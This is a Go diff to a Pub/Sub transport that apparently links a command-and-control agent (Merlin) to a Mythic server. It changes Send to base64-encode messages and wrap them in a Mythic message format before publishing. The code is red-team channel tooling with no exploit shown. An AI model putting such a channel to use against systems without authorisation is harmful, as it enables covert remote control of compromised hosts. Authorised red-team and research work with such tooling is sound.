@@ -45,13 +45,6 @@ func NewTransport(cfg *Config) (*Transport, error) {
 	        opts = append(opts, option.WithCredentialsJSON(credsJSON))
 	} else if cfg.CredentialsFile != "" {
 
-//	if cfg.CredentialsJSON != "" {
-		// Embedded credentials (portable)
-
-//		opts = append(opts, option.WithCredentialsJSON([]byte(cfg.CredentialsJSON)))
-//	} else if cfg.CredentialsFile != "" {
-
-
 		// File-based credentials
 		opts = append(opts, option.WithCredentialsFile(cfg.CredentialsFile))
 	}
@@ -135,15 +128,35 @@ func (t *Transport) Listen(handler func(task map[string]interface{}) map[string]
 
 // Send publishes a message to Mythic server
 func (t *Transport) Send(data map[string]interface{}) error {
-	msgData, err := json.Marshal(data)
-	if err != nil {
-		return err
-	}
+      // Marshal the Merlin message to JSON
+      msgData, err := json.Marshal(data)
+      if err != nil {
+              return err
+      }
 
-	result := t.topic.Publish(t.ctx, &pubsub.Message{Data: msgData})
-	_, err = result.Get(t.ctx)
-	return err
+      // Base64 encode the message
+      encodedMsg := base64.StdEncoding.EncodeToString(msgData)
+
+      // Wrap in MythicMessageWrapper format
+      wrapper := map[string]interface{}{
+              "message":   encodedMsg,
+              "sender_id": "agent",
+              "client_id": "agent",
+              "to_server": true,
+      }
+
+      // Marshal the wrapper
+      wrapperData, err := json.Marshal(wrapper)
+      if err != nil {
+              return err
+      }
+
+      // Publish to Pub/Sub
+      result := t.topic.Publish(t.ctx, &pubsub.Message{Data: wrapperData})
+      _, err = result.Get(t.ctx)
+      return err
 }
+
 
 // Close cleanup
 func (t *Transport) Close() error {
